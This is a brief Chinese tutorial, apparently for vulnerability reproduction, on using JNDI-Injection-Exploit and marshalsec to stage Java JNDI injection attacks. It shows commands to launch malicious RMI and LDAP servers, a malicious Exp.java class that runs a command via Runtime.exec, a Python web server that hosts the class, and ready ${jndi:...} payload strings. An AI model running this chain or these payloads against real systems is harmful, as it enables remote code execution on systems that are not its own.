    在java复现漏洞中，经常碰到关于这个rmi和ldap生成，目前有两款工具相对好用，JNDI-Injection-Exploit和marshalsec。下面看一下这两款的用法。

JNDI-Injection-Exploit-1.0-SNAPSHOT-all：

在Java环境执行:

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc.exe" -A 127.0.0.1#-C 指定执行的命令#-A VPS的ip#注意 1099、8180、1389三个端口不可被占用！

执行完成会生成rmi和ldap的利用链。

箭头部分就是常用的利用链,payload就可以是这样：

${jndi:rmi://127.0.0.1:1099/n6iwge}

marshalsec-0.0.3-SNAPSHOT-all:

这种需要配合web服务去下载恶意类。

构建恶意类Exp.java

import java.lang.Runtime;import java.lang.Process;public class Exp {        static {                try {                        Runtime rt = Runtime.getRuntime();                        String[] commands = {"calc.exe"};                        Process pc = rt.exec(commands);                        pc.waitFor();                    } catch (Exception e) {                            // do nothing                  }       }}

 使用javac 编译一下

javac Exp.java

此时得到新的文件是Exp.class，建立web服务

python3 -m http.server 80python2 -m SimpleHTTPServer 80

接下来可用过marshalsec生成利用链

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ip/#Exp" 7777#如上是生成LDAP,若生成rmi对照下面修改即可：#生成rmi:marshalsec.jndi.RMIRefServer#生成ldap:marshalsec.jndi.LDAPRefServer

执行之后如下：

利用的payload

${jndi:ldap://127.0.0.1:7777/Exp}
